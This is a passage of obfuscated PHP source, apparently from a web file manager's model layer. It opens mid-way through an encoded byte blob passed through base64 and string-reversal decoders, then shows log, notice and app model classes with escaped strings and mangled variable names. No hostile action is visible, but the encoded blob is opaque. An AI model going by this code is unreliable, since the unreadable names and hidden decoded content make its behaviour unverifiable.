xf4\x64\x9d\x50\xe1\x10\x9d\xf\x74\x2\xd6\x30\x71\xa4\x49\x6e\xf0\x85\x7a\xf8\xad\x3e\x4d\x32\x36\x72\xeb\x95\xf0\xe8\x4a\xaf\x94\x9a\x72\x58\x8c\x3a\xa6\xe7\x71\xe6\x1a\x14\x7d"."\335\45\27\242\170\227\347\5\133\102\225\274\317\332\262\41\42\244\100\120\71\351\262\250\113\10\341\317\172\271\204\22\333\373\162\37\142\315\144\247\275\50\312\27\1\154\247\100".strrev('Öÿîª~ÿÿ¦Æa¥^:“Çyí®¦ìùYäœö-Në½ÎıŞÊz¦„QŠ[´šı7Å‰')."\x75\x73\x9a\x99\xda\xdc\xf5\xe\x6e\xf\x30\xcb\x8c\x3f\x5b\x27\xb9\x6c\xa6\x2a\x5b\x4f\x3f\xdc\x9b\xe6\xae\x80\x45\xfc\xc9\x67\x29\xce\xcd\x5a\x99\xf7\x2c\xe6\x54\x4b\x63\x87\x3e\x5a\xa1\x20".base64_decode('ba21xYuqB0QR8o3y1ydrRbzXx7yPiQ6yZ7nJO6HDtTIKysOlmBp4TEGMeS1Vn3vi')."\xf9\x8a\xba\x1d\x1e\x4b\x4c\x46\x55\x36\xf1\x55\xc4\x8b\x30\x47\x64\x41\x16\xca\x60\x81\xd\x73\xa2\x8c\xcc\xca\xf7\x46\xe3\x65\x26\xda\x35\x2\x65\x1f\x5e\xca\xc8\x11\xb9\x89\xe\x54\x49\xa6".base64_decode('RC5QFf1KuWbBBZQHGGYNX7V1P+IOJfo8jyHSTLY8mi7levUxeHVpvvLlIth+2K1v')."\342\17\140\67\173\137\304\156\361\127\177\214\232\357\143\225\107\2\53\31\230\332\210\234\277\220\323\322\32\145\50\246\46\105\236\51\326\112\355\25\313\37\241\24\72\64\34\222"."\373\313\126\176\277\145\22\206\316\15\345\212\27\311\74\123\172\242\171\106\240\152\177\141\324\316\65\344\110\312\22\7\174\206\111\274\236\263\242\3\175\15\344\46\12\140\54\22"."\22\272\115\61\367\322\373\307\170\115\11\247\207\330\105\25\321\365\311\273\66\273\34\46\331\126\3\310\245\221\263\345\7\46\334\45\261\265\274\173\55\55\256\225\55\143\132\266"."\224\215\303\153\345\305\30\46\153\34\344\64\374\126\255\343\232\13\341\300\336\353\270\236\310\341\124\264\166\111\330\160\6\53\203\244\43\112\304\154\147\335\57\141\220\104\2\146".base64_decode('/jGhBumQzX3GyR17V1HKihGVkkkp5nYN/eILdBHhqYEk0+ODkPQMsreU+/ls6UQ0')."\x43\x30\x2f\x5c\x7d\xe8\x25\xce\xe2\x24\x3e\x83\x15\xc3\x92\x90\xd8\x2\x3c\xf0\x5a\xf\x40\xe7\xb4\x31\xc1\x24\x9\x5e\x3c\x9b\xe5\x8f\xb3\xbb\xb2\x66\x99\x34\xc2\xa1\x8\x22\xde\x71\xc7\x4c"._kodDe('MWGDRBRghdDYBMvwXirfREtXs6WVGKAEggy0iI9DBeiYjlF4pmS4Jm/2P2r9bbgASA==')."\111\162\17\276\262\40\314\214\150\127\270\20\57\76\351\276\201\314\263\361\71\103\171\310\5\21\277\13\352\221\344\260\112\204\161\14\236\44\133\176\167\336\175\320\51\153\25\44"."\24\320\13\121\251\72\371\20\164\312\2\311\332\37\21\130\351\36\142\351\352\266\110\140\133\235\351\32\174\211\104\362\216\101\316\204\234\350\152\216\167\152\211\20\42\320\227\2".base64_decode('i0QBS9NC7iSaX/e0Xi7g7RktYY8bTiYvSUbVidVwq2pQ4UO12+ttFRtTr7woKqlq')."\217\144\111\221\62\153\224\241\55\252\131\214\46\341\222\202\135\165\225\235\142\10\160\131\232\204\313\126\45\263\302\222\172\105\52\347\150\25\173\212\356\125\17\36\350\34\262\65"._kodDe('KeEvwYbLXrueW6jf2/bEbrsIaDoaS+LS/dx3sDkgS1tfp5MXClysnQxgOj9O3wJBHw==')."\33\252\351\270\110\253\141\150\101\353\304\173\264\354\312\251\106\262\154\265\121\333\256\43\121\163\351\333\156\203\13\17\134\36\30\360\332\11\334\25\140\33\222\24\13\306\250\260".strrev('’ötÆ‚è%«ë–n{MjÉKO›UY¼²êl9ë'."\n".'ÈÏ|™-R½ô\\3ÔcH')."\41\74\25\171\114\307\310\350\156\157\253\262\107\47\232\316\76\122\220\164\203\36\265\234\320\62\270\14\2\152\50\256\10\10\370\72\241\376\246\365\111\34\213\300\11\327\5\4".base64_decode('yifAkQA9TezEp9b8HIl4CqX7Kk1Ompbjw2kps0x+O0zHEafrVKwnzCDeHH2S8QgK')."\211\103\43\334\50\162\32\101\320\226\220\27\22\204\163\115\54\57\47\165\232\112\210\222\53\202\117\71\170\104\336\373\340\174\263\273\342\71\201\25\0\44\234\246\315\11\346\207".strrev('V_â)_N*â<¦°+_xE†¿~ÿ‚	M íÉ×!6OĞş	ÒÁíz_').base64_decode('aFFFFdR5N9F1wU2RZCpZldQfSiZXxBNd1Nd3VTIpJZkTVSX198ZjU6WF+0KRaFUa')."\266\74\212\251\302\351\26\115\212\364\223\126\222\343\273\251\132\21\351\134\46\132\102\16\212\205\162\276\234\67\231\316\235\35\136\44\265\2\223\322\245\173\220\172\121\170\137\23"."\145\112\106\146\124\50\367\64\211\171\267\231\143\102\36\160\77\234\343\61\360\143\110\12\25\141\253\241\30\324\235\50\3\24\373\76\347\153\335\305\110\253\345\212\343\161\175\114"."\217\24\245\76\123\116\303\165\210\56\301\311\222\41\64\110\102\113\171\57\46\200\246\232\143\50\353\176\253\317\42\110\252\30\43\334\366\203\315\64\215\254\61\323\322\131\3\225"."\x74\xe0\xba\x22\x8c\xba\x64\x3c\x46\xc3\xae\x64\x47\x1b\xa9\x79\x96\x4c\x15\x7e\x98\x28\x8\x55\xdc\xff\x1\x84\xb\xdc\x36\xb\xaa\x0\x0".""."".base64_decode('').base64_decode('')."", 10, -8))); goto cáá£áÇçà; câ×Öè£âó: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\x4c\151\x67\x68\x74\x41\160\x70"; public $modelType = "\123\x79\x73\x74\x65\155\117\160\x74\x69\x6f\156"; public $field = array("\156\141\155\x65", "\x67\162\x6f\x75\160", "\144\x65\163\x63", "\143\157\x6e\164\145\156\x74"); public function listData($ÃúûØíı = false, $ğª¡÷· = "\155\x6f\x64\x69\146\171\124\x69\x6d\x65", $ù¯õüÖõ = true) { return parent::listData($ÃúûØíı, $ğª¡÷·, $ù¯õüÖõ); } public function remove($…ìÆÄ´•) { $Ì¸ËÂş• = $this->findByName($…ìÆÄ´•); if (!$Ì¸ËÂş•) { return !1; } return parent::remove($Ì¸ËÂş•[$_SERVER[ Ö‘ñÄ”][407]]); } public function add($±“Ü”Ô) { if ($this->findByName($±“Ü”Ô[$_SERVER[ Ö‘ñÄ”][32]])) { return !1; } return parent::insert($±“Ü”Ô); } public function update($ÉÄÎŞ¸, $ë“ÖÒİë) { $¸„Š–ê° =& $_SERVER[ Ö‘ñÄ”]; $ÃÅõ£« = $this->findByName($ÉÄÎŞ¸); $ÅÑïÁ† = $this->findByName($ë“ÖÒİë[$¸„Š–ê°[32]]); if (!$ÃÅõ£« || $ÅÑïÁ† && $ÅÑïÁ†[$¸„Š–ê°[407]] != $ÃÅõ£«[$¸„Š–ê°[407]]) { return !1; } return parent::update($ÃÅõ£«[$¸„Š–ê°[407]], $ë“ÖÒİë); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\155\137\154\157\147"; protected $dataAuto = array(array("\x63\162\145\141\x74\x65\124\151\x6d\x65", "\x74\151\x6d\145", "\x69\156\x73\145\162\x74", "\x66\165\156\x63\x74\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $äù÷Æ± =& $_SERVER[ Ö‘ñÄ”]; return array($äù÷Æ±[2164] => LNG($äù÷Æ±[2165]), $äù÷Æ±[2166] => LNG($äù÷Æ±[2167]), $äù÷Æ±[1779] => LNG($äù÷Æ±[2168]), $äù÷Æ±[2169] => LNG($äù÷Æ±[2170]), $äù÷Æ±[2171] => LNG($äù÷Æ±[2172]), $äù÷Æ±[2173] => LNG($äù÷Æ±[2174]), $äù÷Æ±[2175] => LNG($äù÷Æ±[2176]), $äù÷Æ±[1809] => LNG($äù÷Æ±[2176]), $äù÷Æ±[1810] => LNG($äù÷Æ±[2177]), $äù÷Æ±[2178] => LNG($äù÷Æ±[2179]), $äù÷Æ±[2180] => LNG($äù÷Æ±[2181]), $äù÷Æ±[2182] => LNG($äù÷Æ±[2183]), $äù÷Æ±[2184] => LNG($äù÷Æ±[2185]), $äù÷Æ±[1807] => LNG($äù÷Æ±[2186]), $äù÷Æ±[2187] => LNG($äù÷Æ±[2188]), $äù÷Æ±[1814] => LNG($äù÷Æ±[2189]), $äù÷Æ±[2190] => LNG($äù÷Æ±[2191]), $äù÷Æ±[2192] => LNG($äù÷Æ±[2193]), $äù÷Æ±[2194] => LNG($äù÷Æ±[2195]), $äù÷Æ±[2196] => LNG($äù÷Æ±[2197]), $äù÷Æ±[1817] => LNG($äù÷Æ±[2198]), $äù÷Æ±[1818] => LNG($äù÷Æ±[2199]), $äù÷Æ±[2200] => LNG($äù÷Æ±[2201]), $äù÷Æ±[2202] => LNG($äù÷Æ±[2203]), $äù÷Æ±[2204] => LNG($äù÷Æ±[2205]), $äù÷Æ±[1812] => LNG($äù÷Æ±[2206]), $äù÷Æ±[2207] => LNG($äù÷Æ±[2208]), $äù÷Æ±[1811] => LNG($äù÷Æ±[2209]), $äù÷Æ±[2210] => LNG($äù÷Æ±[2211]), $äù÷Æ±[2212] => LNG($äù÷Æ±[2213]), $äù÷Æ±[2214] => LNG($äù÷Æ±[2215]), $äù÷Æ±[2216] => LNG($äù÷Æ±[2216]), $äù÷Æ±[2217] => LNG($äù÷Æ±[1783]), $äù÷Æ±[2218] => LNG($äù÷Æ±[2219]), $äù÷Æ±[2220] => LNG($äù÷Æ±[2221]), $äù÷Æ±[2222] => LNG($äù÷Æ±[2223]), $äù÷Æ±[2224] => LNG($äù÷Æ±[2225]), $äù÷Æ±[2226] => LNG($äù÷Æ±[2227]), $äù÷Æ±[2228] => LNG($äù÷Æ±[2228]), $äù÷Æ±[2229] => LNG($äù÷Æ±[2230]), $äù÷Æ±[2231] => LNG($äù÷Æ±[2232]), $äù÷Æ±[2233] => LNG($äù÷Æ±[2234]), $äù÷Æ±[2235] => LNG($äù÷Æ±[2236]), $äù÷Æ±[2237] => LNG($äù÷Æ±[2238]), $äù÷Æ±[2239] => LNG($äù÷Æ±[2240])); } private function typeFile() { $ÇÙºıù• =& $_SERVER[ Ö‘ñÄ”]; $ËŠÑÓŒ = array($ÇÙºıù•[1814] => array($ÇÙºıù•[1815]), $ÇÙºıù•[2182] => array($ÇÙºıù•[2241]), $ÇÙºıù•[2184] => array($ÇÙºıù•[2242]), $ÇÙºıù•[1807] => array($ÇÙºıù•[1808]), $ÇÙºıù•[2192] => array(), $ÇÙºıù•[2194] => array(), $ÇÙºıù•[2196] => array(), $ÇÙºıù•[1817] => array($ÇÙºıù•[1819]), $ÇÙºıù•[1818] => array($ÇÙºıù•[1819]), $ÇÙºıù•[2200] => array($ÇÙºıù•[2243]), $ÇÙºıù•[2202] => array($ÇÙºıù•[2243]), $ÇÙºıù•[2204] => array($ÇÙºıù•[2244]), $ÇÙºıù•[2190] => array($ÇÙºıù•[2245]), $ÇÙºıù•[1812] => array($ÇÙºıù•[2246]), $ÇÙºıù•[2207] => array($ÇÙºıù•[2247]), $ÇÙºıù•[1811] => array($ÇÙºıù•[1813])); return $ËŠÑÓŒ; } private function typeAll() { $û´•ÊàË =& $_SERVER[ Ö‘ñÄ”]; $ èşËŒ© = $this->typeList; $²ÁÕÀãÀ = array_filter($this->typeFile()); foreach ($²ÁÕÀãÀ as $¾˜ ´ûé => $ÚÖ“Ì”ş) { $ èşËŒ©[$ÚÖ“Ì”ş[0]] = $ èşËŒ©[$¾˜ ´ûé]; } $ èşËŒ©[$û´•ÊàË[1819]] = LNG($û´•ÊàË[2248]); $ èşËŒ©[$û´•ÊàË[2243]] = LNG($û´•ÊàË[2249]); return $ èşËŒ©; } public function addLog($Êöüñš€, $’ÓÇÑÙ¬ = array()) { $Â¬ùëò± =& $_SERVER[ Ö‘ñÄ”]; if (!isset($this->typeList[$Êöüñš€])) { return; } $‹Ãı”¿¦ = defined($Â¬ùëò±[483]) && USER_ID ? USER_ID : (isset($’ÓÇÑÙ¬[$Â¬ùëò±[1663]]) ? $’ÓÇÑÙ¬[$Â¬ùëò±[1663]] : 0); if (!$‹Ãı”¿¦) { $‹Ãı”¿¦ = (int) Session::get($Â¬ùëò±[1973]); } if ($Êöüñš€ == $Â¬ùëò±[2218] && is_array($’ÓÇÑÙ¬[$Â¬ùëò±[2250]]) && !$’ÓÇÑÙ¬[$Â¬ùëò±[2250]]) { return; } $‰¿ˆ¾…á = get_client_ip(); if (!$’ÓÇÑÙ¬ || strlen(json_encode($’ÓÇÑÙ¬)) >= 1024) { $’ÓÇÑÙ¬ = array($Â¬ùëò±[2251] => $‰¿ˆ¾…á); } else { if (is_array($’ÓÇÑÙ¬)) { $’ÓÇÑÙ¬[$Â¬ùëò±[2251]] = $‰¿ˆ¾…á; } else { $’ÓÇÑÙ¬ = array($Â¬ùëò±[1199] => $’ÓÇÑÙ¬, $Â¬ùëò±[2251] => $‰¿ˆ¾…á); } } $’ÓÇÑÙ¬ = array($Â¬ùëò±[1653] => Session::sign(), $Â¬ùëò±[1654] => $‹Ãı”¿¦, $Â¬ùëò±[33] => $Êöüñš€, $Â¬ùëò±[1656] => json_encode($’ÓÇÑÙ¬)); parent::add($’ÓÇÑÙ¬); } public function remove($ÃçÜ‰Šõ) { $this->where(array($_SERVER[ Ö‘ñÄ”][427] => $ÃçÜ‰Šõ))->delete(); } private function _makeOrder($·Ê±˜”ä = '') { $ùô»¿¶ä =& $_SERVER[ Ö‘ñÄ”]; $‹éáù® = $ùô»¿¶ä[200]; $ôÊÛœê‘ = array($ùô»¿¶ä[458] => $ùô»¿¶ä[459], $ùô»¿¶ä[460] => $ùô»¿¶ä[461]); $å¸œò¤¹ = Input::get($ùô»¿¶ä[466], $ùô»¿¶ä[7], $ùô»¿¶ä[2005], array($ùô»¿¶ä[1927], $ùô»¿¶ä[460])); $å¸œò¤¹ = $ôÊÛœê‘[$å¸œò¤¹]; $·Ê±˜”ä = $·Ê±˜”ä . "{$‹éáù®}\40{$å¸œò¤¹}"; return $this->order($·Ê±˜”ä); } public function get($Ãùğâï¢ = '') { $Ó¦ÖÊ¤· =& $_SERVER[ Ö‘ñÄ”]; if (!$Ãùğâï¢) { show_json(array()); } $Ñ™ØÈŠï = array(); if ($Ãùğâï¢[$Ó¦ÖÊ¤·[1663]]) { $Ñ™ØÈŠï[$Ó¦ÖÊ¤·[1663]] = $Ãùğâï¢[$Ó¦ÖÊ¤·[1663]]; } if (isset($Ãùğâï¢[$Ó¦ÖÊ¤·[774]])) { $ÎèÃğµ = $Ãùğâï¢[$Ó¦ÖÊ¤·[774]]; $ãÃµªƒ– = isset($Ãùğâï¢[$Ó¦ÖÊ¤·[505]]) ? $Ãùğâï¢[$Ó¦ÖÊ¤·[505]] : time(); $Ñ™ØÈŠï[$Ó¦ÖÊ¤·[200]] = array($Ó¦ÖÊ¤·[342], array($ÎèÃğµ, $ãÃµªƒ–)); } if ($Ãùğâï¢[$Ó¦ÖÊ¤·[33]]) { $„Óˆ£±ğ = explode($Ó¦ÖÊ¤·[50], $Ãùğâï¢[$Ó¦ÖÊ¤·[33]]); $Ê¯ïœ°‰ = $this->typeFile(); $¬…¡¶Àê = array(); foreach ($„Óˆ£±ğ as $ƒÚ‚‚Ş½) { $¬…¡¶Àê[] = $ƒÚ‚‚Ş½; if (isset($Ê¯ïœ°‰[$ƒÚ‚‚Ş½])) { $¬…¡¶Àê = array_merge($¬…¡¶Àê, $Ê¯ïœ°‰[$ƒÚ‚‚Ş½]); } } $¬…¡¶Àê = array_unique($¬…¡¶Àê); if ($¬…¡¶Àê) { $Ñ™ØÈŠï[$Ó¦ÖÊ¤·[33]] = array($Ó¦ÖÊ¤·[7], $¬…¡¶Àê); } } else { $Ñ™ØÈŠï[$Ó¦ÖÊ¤·[33]] = array($Ó¦ÖÊ¤·[2252], $Ó¦ÖÊ¤·[2253]); } if (!empty($Ãùğâï¢[$Ó¦ÖÊ¤·[2251]])) { $Ñ™ØÈŠï[$Ó¦ÖÊ¤·[461]] = array($Ó¦ÖÊ¤·[391], "\45{$Ãùğâï¢[$Ó¦ÖÊ¤·[2251]]}\45"); } $¦Ãö—öÚ = $this->_makeOrder()->where($Ñ™ØÈŠï)->selectPage(); if (empty($¦Ãö—öÚ[$Ó¦ÖÊ¤·[378]])) { show_json(array(), !0, $¦Ãö—öÚ[$Ó¦ÖÊ¤·[375]]); } $¦Ãö—öÚ[$Ó¦ÖÊ¤·[378]] = $this->logList($¦Ãö—öÚ[$Ó¦ÖÊ¤·[378]]); return $¦Ãö—öÚ; } private function ipAddress(&$ë‚é³»®) { $–¹Äô¦ =& $_SERVER[ Ö‘ñÄ”]; if (!empty($ë‚é³»®[$–¹Äô¦[2251]])) { $¾ßÄ«’à = IpLocation::get($ë‚é³»®[$–¹Äô¦[2251]]); } else { $¾ßÄ«’à = LNG($–¹Äô¦[2254]); } $ë‚é³»®[$–¹Äô¦[2255]] = $¾ßÄ«’à; } private function descZipDownload($ÁÜ˜£¹š, &$ „¦¢Şú) { $†ÉÆ»Í· =& $_SERVER[ Ö‘ñÄ”]; if (!isset($ÁÜ˜£¹š[$†ÉÆ»Í·[2256]])) { return; } $˜³Æ³•ñ = json_decode($ÁÜ˜£¹š[$†ÉÆ»Í·[2256]], !0); foreach ($˜³Æ³•ñ as $çÔÌ•üü) { try { $ŠèøÊˆ„ = IO::infoFull($çÔÌ•üü[$†ÉÆ»Í·[84]]); } catch (Exception $­ÎŠ±ƒæ) { continue; } $ÁÜ˜£¹š[$†ÉÆ»Í·[84]] = $çÔÌ•üü[$†ÉÆ»Í·[84]]; $ „¦¢Şú[] = $ÁÜ˜£¹š[$†ÉÆ»Í·[410]] = $ŠèøÊˆ„[$†ÉÆ»Í·[410]]; $ „¦¢Şú[] = $ÁÜ˜£¹š[$†ÉÆ»Í·[2059]] = $ŠèøÊˆ„[$†ÉÆ»Í·[440]]; break; } return $ÁÜ˜£¹š; } private function getSourceList(&$÷­œ³ğ) { $íƒÀÈ =& $_SERVER[ Ö‘ñÄ”]; $¸ÅİÏ¼ = array(); foreach ($÷­œ³ğ as $ù®ıÓ¢ => $ˆÕØæö›) { $âÖÄ’› = json_decode($ˆÕØæö›[$íƒÀÈ[461]], !0); if ($ˆÕØæö›[$íƒÀÈ[33]] == $íƒÀÈ[1810]) { $âÖÄ’› = $this->descZipDownload($âÖÄ’›, $¸ÅİÏ¼); $÷­œ³ğ[$ù®ıÓ¢][$íƒÀÈ[461]] = json_encode($âÖÄ’›); continue; } if (strpos($ˆÕØæö›[$íƒÀÈ[33]], $íƒÀÈ[2061]) !== 0) { if (!isset($âÖÄ’›[$íƒÀÈ[84]]) || strpos($ˆÕØæö›[$íƒÀÈ[33]], $íƒÀÈ[2257]) !== 0) { continue; } try { $Š‘²ã”’ = IO::infoFull($âÖÄ’›[$íƒÀÈ[84]]); } catch (Exception $±ïîÀ‹ò) { continue; } $¸ÅİÏ¼[] = $âÖÄ’›[$íƒÀÈ[410]] = $Š‘²ã”’[$íƒÀÈ[410]]; $¸ÅİÏ¼[] = $âÖÄ’›[$íƒÀÈ[2059]] = $Š‘²ã”’[$íƒÀÈ[440]]; $÷­œ³ğ[$ù®ıÓ¢][$íƒÀÈ[461]] = json_encode($âÖÄ’›); continue; } $¸ÅİÏ¼[] = $âÖÄ’›[$íƒÀÈ[410]]; $¸ÅİÏ¼[] = $âÖÄ’›[$íƒÀÈ[2059]]; if ($âÖÄ’›[$íƒÀÈ[33]] == $íƒÀÈ[565]) { $¸ÅİÏ¼[] = $âÖÄ’›[$íƒÀÈ[461]][$íƒÀÈ[1166]]; $¸ÅİÏ¼[] = $âÖÄ’›[$íƒÀÈ[461]][$íƒÀÈ[1167]]; } if ($âÖÄ’›[$íƒÀÈ[33]] == $íƒÀÈ[2069]) { $¸ÅİÏ¼[] = $âÖÄ’›[$íƒÀÈ[461]][$íƒÀÈ[410]]; } } if (!$¸ÅİÏ¼) { return array(); } return Model($íƒÀÈ[838])->sourceListInfo($¸ÅİÏ¼, !0); } private function logList($ÆÛ¥«†ç) { $½¢ÖÖ±ã =& $_SERVER[ Ö‘ñÄ”]; $©Éæˆãê = array_to_keyvalue($ÆÛ¥«†ç, $½¢ÖÖ±ã[12], $½¢ÖÖ±ã[1663]); $Ùö·“¦ñ = Model($½¢ÖÖ±ã[543])->userListInfo(array_unique($©Éæˆãê)); $•ãÖ·Åù = $this->getSourceList($ÆÛ¥«†ç); $„Ğó¡Á› = $this->typeAll(); $§ı†©šÌ = array(); $£ìöù = array(); foreach ($ÆÛ¥«†ç as $İ©…İÉä => $ÛÒÈ•©ô) { $®‹«ñâ = $ÛÒÈ•©ô[$½¢ÖÖ±ã[33]]; $¡·à³‚ = isset($Ùö·“¦ñ[$ÛÒÈ•©ô[$½¢ÖÖ±ã[1663]]]) ? $Ùö·“¦ñ[$ÛÒÈ•©ô[$½¢ÖÖ±ã[1663]]] : !1; $ó•ÊË½˜ = strpos($®‹«ñâ, $½¢ÖÖ±ã[2258]) === 0 ? LNG($½¢ÖÖ±ã[2259]) : LNG($½¢ÖÖ±ã[2254]); $ÛÒÈ•©ô[$½¢ÖÖ±ã[32]] = isset($¡·à³‚[$½¢ÖÖ±ã[32]]) ? $¡·à³‚[$½¢ÖÖ±ã[32]] : LNG($½¢ÖÖ±ã[2254]); $ÛÒÈ•©ô[$½¢ÖÖ±ã[550]] = isset($¡·à³‚[$½¢ÖÖ±ã[550]]) ? $¡·à³‚[$½¢ÖÖ±ã[550]] : $½¢ÖÖ±ã[12]; $ÛÒÈ•©ô[$½¢ÖÖ±ã[1562]] = isset($„Ğó¡Á›[$®‹«ñâ]) ? $„Ğó¡Á›[$®‹«ñâ] : $ó•ÊË½˜; $ÛÒÈ•©ô[$½¢ÖÖ±ã[2004]] = $¡·à³‚; $¹® ™”İ = json_decode($ÛÒÈ•©ô[$½¢ÖÖ±ã[461]], !0); $ÛÒÈ•©ô[$½¢ÖÖ±ã[2251]] = isset($¹® ™”İ[$½¢ÖÖ±ã[2251]]) ? $¹® ™”İ[$½¢ÖÖ±ã[2251]] : $½¢ÖÖ±ã[12]; $ÛÒÈ•©ô[$½¢ÖÖ±ã[2255]] = IpLocation::get($ÛÒÈ•©ô[$½¢ÖÖ±ã[2251]]); if (strpos($®‹«ñâ, $½¢ÖÖ±ã[2061]) === 0 || isset($¹® ™”İ[$½¢ÖÖ±ã[2059]])) { $¹® ™”İ[$½¢ÖÖ±ã[86]] = $•ãÖ·Åù[$¹® ™”İ[$½¢ÖÖ±ã[410]]]; $¹® ™”İ[$½¢ÖÖ±ã[2074]] = $•ãÖ·Åù[$¹® ™”İ[$½¢ÖÖ±ã[2059]]]; if ($¹® ™”İ[$½¢ÖÖ±ã[33]] == $½¢ÖÖ±ã[565]) { $¹® ™”İ[$½¢ÖÖ±ã[461]][$½¢ÖÖ±ã[1166]] = $•ãÖ·Åù[$¹® ™”İ[$½¢ÖÖ±ã[461]][$½¢ÖÖ±ã[1166]]]; $¹® ™”İ[$½¢ÖÖ±ã[461]][$½¢ÖÖ±ã[1167]] = $•ãÖ·Åù[$¹® ™”İ[$½¢ÖÖ±ã[461]][$½¢ÖÖ±ã[1167]]]; } if ($¹® ™”İ[$½¢ÖÖ±ã[33]] == $½¢ÖÖ±ã[2069]) { $¹® ™”İ[$½¢ÖÖ±ã[461]][$½¢ÖÖ±ã[410]] = $•ãÖ·Åù[$¹® ™”İ[$½¢ÖÖ±ã[461]][$½¢ÖÖ±ã[410]]]; } if ($¹® ™”İ[$½¢ÖÖ±ã[33]] == $½¢ÖÖ±ã[1805]) { $¹® ™”İ[$½¢ÖÖ±ã[2074]] = $¹® ™”İ[$½¢ÖÖ±ã[86]]; $¹® ™”İ[$½¢ÖÖ±ã[2059]] = $¹® ™”İ[$½¢ÖÖ±ã[2074]][$½¢ÖÖ±ã[410]]; $¹® ™”İ[$½¢ÖÖ±ã[86]] = !1; $¹® ™”İ[$½¢ÖÖ±ã[410]] = $½¢ÖÖ±ã[12]; } if ($¹® ™”İ[$½¢ÖÖ±ã[86]] && $¹® ™”İ[$½¢ÖÖ±ã[86]][$½¢ÖÖ±ã[419]] == $½¢ÖÖ±ã[1282]) { $£ìöù[] = $ÛÒÈ•©ô[$½¢ÖÖ±ã[407]]; unset($ÆÛ¥«†ç[$İ©…İÉä]); continue; } if ($¹® ™”İ[$½¢ÖÖ±ã[2074]] && $¹® ™”İ[$½¢ÖÖ±ã[2074]][$½¢ÖÖ±ã[419]] == $½¢ÖÖ±ã[1282]) { $£ìöù[] = $ÛÒÈ•©ô[$½¢ÖÖ±ã[407]]; unset($ÆÛ¥«†ç[$İ©…İÉä]); continue; } } $ÛÒÈ•©ô[$½¢ÖÖ±ã[461]] = $¹® ™”İ; unset($ÛÒÈ•©ô[$½¢ÖÖ±ã[2260]]); $§ı†©šÌ[] = $ÛÒÈ•©ô; } $this->clearSystemPathLog($£ìöù); return $§ı†©šÌ; } private function clearSystemPathLog($Ïßö³¤ã) { $™‹¨‡¸— =& $_SERVER[ Ö‘ñÄ”]; if (count($Ïßö³¤ã) == 0) { return; } $×İÍÃ•İ = array($™‹¨‡¸—[407] => array($™‹¨‡¸—[7], array_unique($Ïßö³¤ã))); $this->where($×İÍÃ•İ)->delete(); } public function deviceList($ªé§òöÛ, $’©ŒâÙ¿ = 0) { $­¬öÑ¤­ =& $_SERVER[ Ö‘ñÄ”]; $À‡ø»¶Å = array($­¬öÑ¤­[1663] => $ªé§òöÛ, $­¬öÑ¤­[200] => array($­¬öÑ¤­[1020], $’©ŒâÙ¿), $­¬öÑ¤­[33] => $­¬öÑ¤­[1779]); $ÂˆÄö›­ = array(); $µÆÇ€ğ = $this->field($­¬öÑ¤­[2261])->where($À‡ø»¶Å)->order($­¬öÑ¤­[2072])->limit(50)->select(); foreach ($µÆÇ€ğ as $š’ïò½ô => $õÒŒ¥ë§) { if ($š’ïò½ô > 0 && abs($õÒŒ¥ë§[$­¬öÑ¤­[200]] - $µÆÇ€ğ[$š’ïò½ô - 1][$­¬öÑ¤­[200]]) < 5) { continue; } $â¡Ÿîî = json_decode($õÒŒ¥ë§[$­¬öÑ¤­[461]], !0); $õÒŒ¥ë§[$­¬öÑ¤­[2251]] = isset($â¡Ÿîî[$­¬öÑ¤­[2251]]) ? $â¡Ÿîî[$­¬öÑ¤­[2251]] : $­¬öÑ¤­[12]; unset($â¡Ÿîî[$­¬öÑ¤­[2251]]); $µ˜ßğëú = $this->deviceType($â¡Ÿîî[$­¬öÑ¤­[2062]]); if (isset($ÂˆÄö›­[$µ˜ßğëú])) { continue; } $õÒŒ¥ë§[$­¬öÑ¤­[2255]] = IpLocation::get($õÒŒ¥ë§[$­¬öÑ¤­[2251]]); $õÒŒ¥ë§[$­¬öÑ¤­[461]] = $â¡Ÿîî; $ÂˆÄö›­[$µ˜ßğëú] = $õÒŒ¥ë§; } return array_values($ÂˆÄö›­); } public function deviceType($¼øœ¢¶Ú) { return $¼øœ¢¶Ú; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\156\x6f\164\x69\143\x65\114\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\x63\x6f\156\x74\x65\x6e\x74", "\x61\x75\164\x68", "\x6d\x6f\x64\x65", "\164\x69\x6d\145", "\x74\171\x70\x65", "\154\145\x76\145\154", "\x65\x6e\x61\x62\x6c\x65", "\163\x6f\162\164"); public function listData($¤ûçÏï = false, $ÅàœÃ›ü = "\x73\157\x72\164", $½¨à“¿ = false) { return parent::listData($¤ûçÏï, $ÅàœÃ›ü, $½¨à“¿); } public function add($ÓÍ¡¡ÒÚ) { $Ø¨¶òı– =& $_SERVER[ Ö‘ñÄ”]; $¾ı×ˆ = time(); if ($ÓÍ¡¡ÒÚ[$Ø¨¶òı–[16]] == $Ø¨¶òı–[2262]) { $¾ı×ˆ = strtotime($ÓÍ¡¡ÒÚ[$Ø¨¶òı–[203]]); } $ÓÍ¡¡ÒÚ[$Ø¨¶òı–[203]] = $¾ı×ˆ; return parent::insert($ÓÍ¡¡ÒÚ); } public function update($Í‰àô±Ù, $Ö¸Ë¤„–) { $ÅÔ³’ =& $_SERVER[ Ö‘ñÄ”]; $š»£ÎŒø = $this->listData($Í‰àô±Ù); if (!$š»£ÎŒø) { return !1; } $ì¿‚ÜùÉ = time(); if ($Ö¸Ë¤„–[$ÅÔ³’[16]] == $ÅÔ³’[2262]) { $ì¿‚ÜùÉ = strtotime($Ö¸Ë¤„–[$ÅÔ³’[203]]); } $Ö¸Ë¤„–[$ÅÔ³’[203]] = $ì¿‚ÜùÉ; return parent::update($Í‰àô±Ù, $Ö¸Ë¤„–); } public function remove($íéöàŠ) { $Èê… – = $this->listData($íéöàŠ); if (!$Èê… – || $Èê… –[$_SERVER[ Ö‘ñÄ”][1282]]) { return !1; } return parent::remove($íéöàŠ); } public function sort($ÇÚ÷–¼´, $Ö–ùÑĞ) { return parent::update($ÇÚ÷–¼´, $Ö–ùÑĞ); } public function enable($áÀÄó , $’‹µğ·) { return parent::update($áÀÄó , array($_SERVER[ Ö‘ñÄ”][2263] => $’‹µğ·)); } private function initUserOption() { $ ´¢¿İŠ =& $_SERVER[ Ö‘ñÄ”]; $this->optionType = $ 